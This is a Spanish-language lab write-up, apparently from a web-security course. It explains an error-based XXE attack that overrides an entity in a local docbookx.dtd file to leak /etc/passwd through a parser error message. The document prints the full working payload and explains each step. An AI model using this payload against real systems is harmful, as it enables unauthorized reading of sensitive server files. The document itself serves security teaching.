En esta clase, continuamos con el mismo laboratorio anterior, en el que reutilizamos un DTD local del sistema para realizar un ataque XXE. En esta segunda parte, terminamos de afinar la carga útil que redefine una entidad del archivo ‘**docbookx.dtd**‘ y genera un error controlado que nos permite exfiltrar el contenido del archivo /etc/passwd.

El objetivo es que, al provocar este error, el mensaje resultante contenga el contenido del archivo, lo cual permite resolver el laboratorio sin necesidad de respuestas visibles ni conexiones externas. Esta técnica es especialmente útil en entornos restringidos donde no es posible interactuar con servidores externos.
Solucion
siguiendo con la solucion vamos a  construir un payload
payload (<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>)
Que hace ?
### Paso a paso

1. **`<!DOCTYPE message [...]>`**  
    Se declara un tipo de documento con una definición interna de entidades.
    
2. **`<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">`**  
    Se intenta cargar una DTD externa (local en el sistema) para expandir nuevas entidades. En este caso, `docbookx.dtd`, que se supone debe incluir una entidad llamada `ISOamso`.
    
3. **`<!ENTITY % ISOamso ' ... '>`**  
    Si `docbookx.dtd` define `%ISOamso`, lo redefine con un nuevo contenido (es un tipo de _entity override_).
    
4. **Dentro del redefinido `ISOamso`**:
    
    xml
    `<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;`
    
    - `%file` carga el archivo `/etc/passwd`.
        
    - `%eval` crea una entidad `%error` que intenta cargar un archivo inexistente con el contenido de `%file` como parte de la ruta.
        
    - `%eval;` y `%error;` expanden esas entidades.
### 🎯 Objetivo final

El objetivo de este payload es forzar al parser XML a:

- **Leer `/etc/passwd`.**
    
- **Inyectar su contenido como parte de una URL**, causando un error de carga en `file:///nonexistent/<contenido_de_passwd>`, lo cual puede provocar que el contenido del archivo aparezca en logs o mensajes de error, revelando información sensible.

y este codigo lo injectamos y con esto leemos el archivo etc/passwd
![Pasted_image_20250802192652.png](Imagenes/Pasted_image_20250802192652.png)
